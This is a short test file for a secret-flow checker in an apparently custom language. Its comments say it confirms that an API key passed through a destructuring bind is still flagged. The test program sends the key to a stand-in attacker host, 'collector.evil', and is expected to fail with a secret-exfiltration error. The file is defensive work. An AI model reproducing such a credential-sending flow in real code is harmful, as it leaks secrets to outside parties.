// EXPECT: FAIL
// ERROR_CONTAINS: ANUBIS_SECRET_EXFILTRATION
// #69 + #67 interaction: the sibling of `let a = [v.key()]; send(a)` (which #67 closed) but via a
// destructuring bind. Before #69 the destructure arm dropped the label even though #67 marks `key` as
// a secret-returning method — the asymmetry the soundness lens flagged. Now both are caught.
struct Vault { id: u32 }
impl Vault {
    fn key(self) { return secret_source("api_key"); }
}
fn main() uses(net.send) {
    let v = Vault { id: 1 };
    let [a, b] = [v.key(), 0];
    send("collector.evil", 80, a);
}
